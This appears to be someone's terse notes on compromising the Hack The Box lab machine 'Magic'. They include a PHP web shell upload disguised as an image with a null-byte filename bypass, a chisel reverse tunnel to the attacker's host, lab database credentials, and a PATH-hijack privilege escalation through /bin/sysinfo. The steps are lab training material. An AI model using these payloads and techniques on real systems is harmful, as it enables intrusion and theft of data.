### foothold
```
------WebKitFormBoundaryO4Ah2DIFGOp8Tlpk
Content-Disposition: form-data; name="image"; filename="test11.php%00.png"
Content-Type: application/x-php

ÿØÿà ..*GGIEGULXY # Try to use a legit img first. Then LEFT a full line here to help you bypass second layer magic byte check.

<?php system($_GET["cmd"]);?>

# If that still doesn't work, try put the payload into middle of an image
```
##### File not found even it says upload successfully
try encode `test11.php%00.png` -> `test11.php%2500.png`

##### www-data
```
image/jpeg

stty rows 39 columns 165

```

### Lateral
##### SSH as www-data, But failed
```bash
www-data@ubuntu:/var/www$ cd Magic
www-data@ubuntu:/var/www/Magic$ mkdir .ssh

ssh-keygen -q -t rsa -N '' -C 'pam'
/var/www/Magic/.ssh/id_rsa

cp .ssh/id_rsa.pub .ssh/authorized_keys
chmod 600 .ssh/authorized_keys 
```

```bash
ssh -i /tmp/key www-data@10.129.223.83 # X
ssh Magic@10.129.223.83 -i key # X
```

```bash
# Chisel
./chisel server -p 8000 --reverse
./chisel client 10.10.16.9:8000 R:3306:127.0.0.1:3306

mysql -h 127.0.0.1 -u theseus -D Magic -piamkingtheseus # 3306 is default
```

admin
Th3s3usW4sK1ng

`su theseus`

### Root
##### Interesting that picked up by at least two tools
```bash
/bin/sysinfo

echo "/bin/bash" > lshw
chmod +x lshw
PATH=.:$PATH /bin/sysinfo
```

### Alternative mysql pivoting
##### Database Dump
https://0xdf.gitlab.io/2020/08/22/htb-magic.html#database-dump
```bash
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic

```